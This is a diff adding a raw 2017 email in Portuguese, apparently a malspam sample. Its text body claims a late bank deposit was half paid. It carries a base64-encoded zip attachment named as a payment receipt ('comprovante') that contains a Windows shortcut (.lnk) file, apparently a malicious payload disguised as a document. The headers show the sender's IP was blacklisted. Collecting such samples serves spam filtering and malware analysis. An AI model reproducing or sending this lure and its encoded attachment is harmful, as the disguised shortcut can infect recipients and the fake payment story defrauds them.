@@ -1,0 +1,78 @@
+Received: from 185.8.51.219 by s602e.ik2.com (IK2 SMTP Server); Thu, 28 Sep 2017 16:17:00 +0000
+Received: by notif31.optmail.com.br (Postfix, from userid 0)
+	id 8822C83E2F; Thu, 28 Sep 2017 17:00:24 +0200 (CEST)
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple;
+	d=notif31.optmail.com.br; s=mail; t=1506614131;
+	bh=B+b2XleLs8CKhRKdyfftlbS5+gE37Rp61qHoZ+pnqFw=;
+	h=Date:From:To:Subject:From;
+	b=fEzOVYFBvolBZ2ZY6zYiwvAmL02Sl6+u/qWL/E5EVJItNpQ4fpUKtLIyUhqqBgQH3
+	 d7p5PGGmQDKR3tU1R40HjhF219GZ91xkhAWk4Zu1Y5UfyJkJWFEzPXW8z+a+c+Ltbh
+	 eTgIpa/uaIT/4fsscdH5Tk4aGP8dyMmP34RC2fnc=
+Content-Transfer-Encoding: binary
+Content-Type: multipart/mixed; boundary="_----------=_15066108241112235213"
+MIME-Version: 1.0
+X-Mailer: MIME::Lite 3.030 (F2.84; T2.04; A2.12; B3.13; Q3.13)
+Date: Thu, 28 Sep 2017 17:00:24 +0200
+From: Rafael CVC<rafael87-cvc@notif31.optmail.com.br>
+To: roni@embrast.com.br
+ 
+Subject: Fiz o Deposito 64470/2016 em Atraso
+Message-Id: <20170928155531.8822C83E2F@notif31.optmail.com.br>
+X-SF-RX-Return-Path: <rafael87-cvc@notif31.optmail.com.br>
+X-SF-HELO-Domain: notif31.optmail.com.br
+X-SF-Originating-IP: 185.8.51.219
+X-Rejection-Reason: 12 - 521 The IP 185.8.51.219 is Blacklisted by invaluement.ik2. --- 
+
+This is a multi-part message in MIME format.
+
+--_----------=_15066108241112235213
+Content-Disposition: inline
+Content-Transfer-Encoding: base64
+Content-Type: text/plain; charset=utf-8
+
+T2ksIG7Do28gY29uc2VndWkgZGVwb3NpdGFyIG9udGVtIG1hcyBmaXogdW1hIHRyYW5zZmVyw6pu
+Y2lhIHByYSBzdWEgY29udGEgaG9qZSBkYSBtZXRhZGUgZG8gdmFsb3IuIEF0w6kgc2VndW5kYS1m
+ZWlyYSB0cmFuc2Zpcm8gYSBvdXRyYSBtZXRhZGUuIEFicmHDp28hCgoKClJhZmFlbAo=
+
+--_----------=_15066108241112235213
+Content-Disposition: attachment; filename="comprovante_64470_2017.zip"
+Content-Transfer-Encoding: base64
+Content-Type: application/zip; name="comprovante_64470_2017.zip"
+
+UEsDBBQACAgIAHVXPEsAAAAAAAAAAAAAAAAaAAAAY29tcHJvdmFudGVfODkx
+MDJfMjAxNy5sbmvtV11oW1Uc/3ers0OUzFWZRV1e6kCbNF3Srgsqu23SLLZp
+k2XpF1ewJpckNh81SZNWRPBhCoIPYyB70RWFPTgYiA8DV2QiCA7nfBH0bQo6
+2bB+vAk++Dv/c++596aZfRJEvJdzzj3/76/zcaeIqKt3F4nnCvc0cfsYkRcf
+F957K3R/99Uua/z10K2SFyP9tIcJu8j9/NbVSweTN2a+8t4KFz3vftNDTwQC
+bz9Eg+NhnbY/J2iIx4HJawMe71yxkqu26vQk9VA3/fLxVvhUn8A8DorPuzqp
+m6MiVShHVWpRHfMHadaUGJq892UPpdfrDaMcPEz0tJL5Wp/ACZmrezrJTNM6
+ZDXIoDIFCax0gAqm1K3w+QEPzcWnIzNzrwCUVFLPD4gmpB67Z2dLkzwaVIO2
+AsYSXqHnGVPP8OR3H3moOeQPEI04dAi40KF11NEEt5/AQr2QCsuRpK3wtb1e
+Wqm2jFq9YJRKfmPNIOiRMn8O798UTcg8d7qTzBVlaV1Z6se4hkb0KFoB7WGT
+U4w+kzOPtg9tN9oXj/x4n0cAUQZmlnUrNxYgKWxMCxt14bjebnMUev2k37F3
+R1jflsd2ik450FUM9b/1vLDb55KWhp514A0smuOA5/AawHoRjSjGLKgEJEfj
++CrjXWJeLzKh0Rh0auCLo38eTUPsNIrACo1hGiRqFGNojukDTC8wMwxtoo3T
+KPoFzMdguy2vhXmJ+QVXlrlWeR5Cv0gpU57kX2J8QPEvMn9V6Zf0FUWfZXte
+YnwGfYKpVpk/hd5Q9o6zvAhDJ3meUvYNKfqsIx4p5f9Rptd4LvyLsCRh1TzT
+zzJ9Qtm3ruYSn+J5RsWnzvYu81zozyp7JL+0f8GM7xi9wPSjbK/At5Q8mY+S
+I96CvqDivchSZbyryr9Kh3hE2R5bfsyMb17FT/QnGd9kfIr1p5Q/GTNeYxwr
+6V9O5WfCjK9tX4jnwv+y4s9y/qY51sLeDOMDjI92sCflqLeUkpdR8VhwxFPm
+J++Kl8xvg+1LtNVDXOWnpPJ/5/Ui7TnhyEdC+b+i/F1Q9R4z490y7XPKb7bl
+151vZ3za61na21T6crR9PY/x2o055DU4/wmXPce31aO9HpZVfeSUP3I/sOea
+mSWrfp3rJejwX+Cd8lqqXloqn8Nt8bT3kwRTrSv6Waa3473oiGdWyUu16bPr
+IePYbzJmfmV9S/k5juUaexZi/Zq5fqX/Mn5BVz1b+5O9f8n1IuRNOerRwlv1
+pDFe0M/vEK+TZO93ndZjXPHLeCw7/Mu31a+V75ijHmx6yR8h937UIGt92vY5
+69m5f+W31YdGT9EgIhXGqZfEeVcFrIaToIzzaQJnjzjXxIkax77V4BOxgr4B
+bBSZWAG+CpiA66A2XDDrxOzFNeBuoo1+eexHasWm0a8na9V8bansnSiWjLoe
+rzSMWsVoeKNrK6VqzajpRUN+yRvAf+Xpd91NIohTESvEAPyfi///z7/vETfi
+u8SawPg1ydszLvYbrelP+m7uenb6UsT/wcXU2UsCdxVtL3Di/2AonUzfOHXu
+9z9mCp4Lp/GLdejDbx8AnH9nDpL7Ev+myfD9G/MTm1Oj45f/3H/msbPlL18E
+vNtiGCTx3+PDuerDXu/DbVl8hbBDiK8ROoIdNYivw4w7CpoQ36lH8BVE70M/
+ineE4YI+gJmQF2AZzuc54n+CjXlzXqkPBwLDR0YtfKH26tTlT99PbFZev776
+2eAPg2duTx145+a+i9cpOXuFenbCCxl/AVBLBwivXR9bJwUAANMOAABQSwEC
+FAAUAAgICAB1VzxLr10fWycFAADTDgAAGgAAAAAAAAAAAAAAAAAAAAAAY29t
+cHJvdmFudGVfODkxMDJfMjAxNy5sbmtQSwUGAAAAAAEAAQBIAAAAbwUAAAAA
+
+--_----------=_15066108241112235213--
+
+.
